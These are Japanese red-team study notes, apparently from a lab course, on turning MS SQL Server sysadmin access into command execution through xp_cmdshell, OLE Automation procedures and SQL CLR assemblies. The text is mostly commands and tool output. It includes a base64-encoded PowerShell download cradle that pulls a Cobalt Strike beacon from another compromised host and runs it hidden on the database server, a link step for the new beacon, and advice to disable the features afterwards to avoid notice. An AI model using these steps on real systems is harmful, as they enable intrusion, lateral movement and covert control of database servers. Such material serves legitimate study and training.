sysadmin権限(デフォルト無効）があれば悪用が可能

## xp_cmdshell
コマンド実行のためのよく知られた方法
コマンドシェルを生成し、文字列を渡す。出力はテキストとして返ってくる

```sql
EXEC xp_cmdshell '<command>';
```

### 悪用方法
`sql-query`でxp_cmdshellがすでに有効かされているかを確認
```bash
sql-query lon-db-1 "SELECT name,value FROM sys.configurations WHERE name = 'xp_cmdshell'"
```
出力で値が0は無効化されていることを示す。
```
[*] Connecting to lon-db-1:1433
[+] Successfully connected to database
[*] Executing custom query on lon-db-1

name | value | 
---------------
xp_cmdshell | 0 |

[*] Disconnecting from server
```

有効化するには`sql-enablexp`を使用
```
sql-enablexp lon-db-1
```

再び実行
```
sql-xpcmd lon-db-1 "hostname && whoami"
```

無効化!
```
sql-disablexp lon-db-1
```

## OLE Automation
### OLEとは何か
```
Office時代
└─ OLE（Object Linking and Embedding）
      └─ ExcelシートをWordに埋め込む等の仕組み
            └─ COMの基盤技術に発展
                  └─ SQL ServerがCOMオブジェクトを操作できるように → OLE Automation
```

本来はアプリ間連携のための技術ですが、SQL Serverに「任意のCOMオブジェクトを呼べる」ストアドプロシージャ群が実装されているため攻撃に悪用されます。

### sp_OA系ストアドプロシージャの役割

|プロシージャ|役割|
|---|---|
|`sp_OACreate`|COMオブジェクトのインスタンス生成|
|`sp_OAMethod`|そのオブジェクトのメソッド呼び出し|
|`sp_OAGetProperty` / `sp_OASetProperty`|プロパティの取得／設定|
|`sp_OADestroy`|インスタンス破棄|
|`sp_OAStop`|実行環境の停止|

`sql-olecmd` は内部的に **`WScript.Shell`** というCOMオブジェクトを使っており、これの `Run` メソッドでシェルコマンドを実行

### 悪用方法
OLE Automationの確認。値が0の場合は無効化されている
```
sql-query lon-db-1 "SELECT name,value FROM sys.configurations WHERE name = 'Ole Automation Procedures'"
```

有効化
```
sql-enableole lon-db-1
```

コマンド実行
```
sql-olecmd lon-db-1 "cmd /c calc"
```

CobaltStrikeのWebサーバでペイロード配信して実行する場合
SQLサーバはDMZや内部セグメントに設置されて、直接外部に通信できないケースが多い
> [!NOTE]
> ペイロード=ビーコンなのでこの方法だとLON-WKSTN（ペイロード配信するCobaltStrikeの侵害ホスト）とリンク接続させることができる
> ![[images/Pasted image 20260513002654.png]]

ペイロード
```powershell
$cmd = 'iex (new-object net.webclient).downloadstring("http://lon-wkstn-1:8080/b")' [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd)) # UnicodeのBytesにするのがポイント（-encはUTF-16LE想定）
```

実行
LON-WKSTN -> LOB-DB-1のようにペイロードがダウンロードされるイメージ
```
sql-olecmd lon-db-1 "cmd /c powershell -w hidden -nop -enc [BASE64]"
```

新しいビーコンとしてリンク接続
```
link lon-db-1 TSVCPIPE-xxxxxxxx
```

無効化(OPSECの基本！)
```
sql-disableole lon-db-1
```
## SQL Common Language Runtime(SQL CLR)
### SQL CLRとは

SQL Server 2005で導入された、**.NETランタイムをSQL Server内に統合する機能**です。

```
通常のストアドプロシージャ
└─ T-SQL（SQL Server独自言語）で記述

SQL CLR ストアドプロシージャ
└─ C# / VB.NET等のマネージドコードで記述
      └─ DLLとしてコンパイル → DBに登録 → T-SQLから呼び出し可能
```
### コードの構造要件
```csharp
public partial class StoredProcedures        // クラス名は固定
{
    [SqlProcedure]                           // この属性が必須
    public static void MyProcedure()
    {
        // ここに任意のC#コード
    }
}
```

- クラス名は `StoredProcedures`（`partial`必須）
- メソッドに `[SqlProcedure]` 属性を付与
- これを満たせばあとは**普通のC#として何でも書ける**

### 悪用方法
SQL CLRの確認
```
sql-query lon-db-1 "SELECT value FROM sys.configurations WHERE name = 'clr enabled'"
```

有効化
```
sql-enableclr lon-db-1
```

DLLのロードと実行
```
sql-clr lon-db-1 C:\Users\Attacker\source\repos\ClassLibrary1\bin\Release\ClassLibrary1.dll MyProcedure
```

無効化
```
sql-disableclr lon-db-1
```